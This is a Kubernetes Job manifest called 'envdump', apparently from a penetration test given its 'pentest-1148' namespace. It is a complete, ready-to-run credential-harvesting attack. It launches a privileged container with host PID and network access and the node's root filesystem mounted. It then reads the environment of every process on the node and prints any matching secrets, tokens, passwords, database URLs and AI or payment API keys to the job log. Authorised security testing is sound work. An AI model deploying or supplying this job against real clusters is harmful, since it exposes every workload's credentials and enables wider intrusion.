apiVersion: batch/v1
kind: Job
metadata:
  name: envdump
  namespace: pentest-1148
  labels:
    purpose: pentest-1148
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 86400
  template:
    metadata:
      labels:
        purpose: pentest-1148
    spec:
      serviceAccountName: probe
      restartPolicy: Never
      hostNetwork: true
      hostPID: true
      containers:
      - name: c
        image: busybox:1.36
        securityContext:
          privileged: true
        volumeMounts:
        - name: hostroot
          mountPath: /host
        command: ["/bin/sh","-c"]
        args:
        - |
          for p in /proc/[0-9]*; do
            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null | head -c 140)
            [ -z "$cmd" ] && continue
            envv=$(tr '\0' '\n' < $p/environ 2>/dev/null | grep -Ei 'SECRET|_TOKEN=|PASSWORD|DATABASE_URL|OPENAI|ANTHROPIC|API_KEY|VAULT|JWT|APP_KEYS|DSN|REDIS|STRIPE|PROVIDER|KEY=' | head -14)
            if [ -n "$envv" ]; then
              echo "########## PID ${p#/proc/} :: $cmd"
              echo "$envv"
            fi
          done 2>&1 | head -500
          echo "##END##"
      volumes:
      - name: hostroot
        hostPath:
          path: /
